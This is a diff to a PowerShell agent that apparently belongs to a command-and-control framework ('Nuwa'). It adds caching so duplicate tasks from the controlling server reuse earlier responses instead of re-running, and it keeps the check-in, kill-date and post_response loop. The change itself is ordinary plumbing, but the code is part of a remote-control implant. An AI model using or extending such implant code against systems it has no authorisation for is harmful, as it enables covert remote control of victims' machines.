@@ -297,6 +297,13 @@ function Invoke-NuwaTaskLoop {
     [CmdletBinding()]
     param()
 
+    if ($null -eq $script:NuwaCompletedTaskResponses) {
+        $script:NuwaCompletedTaskResponses = @{}
+    }
+    if ($null -eq $script:NuwaCompletedTaskIds) {
+        $script:NuwaCompletedTaskIds = @()
+    }
+
     while (-not $script:NuwaState.ExitRequested) {
         if (Test-NuwaKilldatePassed -Killdate $script:NuwaConfig.Killdate) {
             break
@@ -306,8 +313,33 @@ function Invoke-NuwaTaskLoop {
         if ($tasking -and $tasking.tasks) {
             Write-NuwaDebug ("Received {0} task(s)" -f $tasking.tasks.Count)
             foreach ($task in $tasking.tasks) {
-                $response = Invoke-NuwaTask -Task $task
-                Write-NuwaDebug ("Sending post_response for task {0}" -f [string]$task.id)
+                $taskId = [string]$task.id
+                if (
+                    -not [string]::IsNullOrWhiteSpace($taskId) -and
+                    $script:NuwaCompletedTaskResponses.ContainsKey($taskId)
+                ) {
+                    $response = $script:NuwaCompletedTaskResponses[$taskId]
+                    Write-NuwaDebug ("Reusing completed response for duplicate task {0}" -f $taskId)
+                } else {
+                    $response = Invoke-NuwaTask -Task $task
+                    if (-not [string]::IsNullOrWhiteSpace($taskId)) {
+                        $maximumCompletedTasks = 256
+                        if ($script:NuwaCompletedTaskIds.Count -ge $maximumCompletedTasks) {
+                            $oldestTaskId = [string]$script:NuwaCompletedTaskIds[0]
+                            [void]$script:NuwaCompletedTaskResponses.Remove($oldestTaskId)
+                            if ($script:NuwaCompletedTaskIds.Count -eq 1) {
+                                $script:NuwaCompletedTaskIds = @()
+                            } else {
+                                $script:NuwaCompletedTaskIds = @(
+                                    $script:NuwaCompletedTaskIds[1..($script:NuwaCompletedTaskIds.Count - 1)]
+                                )
+                            }
+                        }
+                        $script:NuwaCompletedTaskResponses[$taskId] = $response
+                        $script:NuwaCompletedTaskIds += $taskId
+                    }
+                }
+                Write-NuwaDebug ("Sending post_response for task {0}" -f $taskId)
                 [void](Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'post_response' -Body @{ responses = @($response) })
                 if ($script:NuwaState.ExitRequested) {
                     break
@@ -328,6 +360,8 @@ function Start-Nuwa {
     param()
 
     $script:NuwaState.CurrentDirectory = (Get-Location).ProviderPath
+    $script:NuwaCompletedTaskResponses = @{}
+    $script:NuwaCompletedTaskIds = @()
     Invoke-NuwaCheckin
     Invoke-NuwaTaskLoop
 }
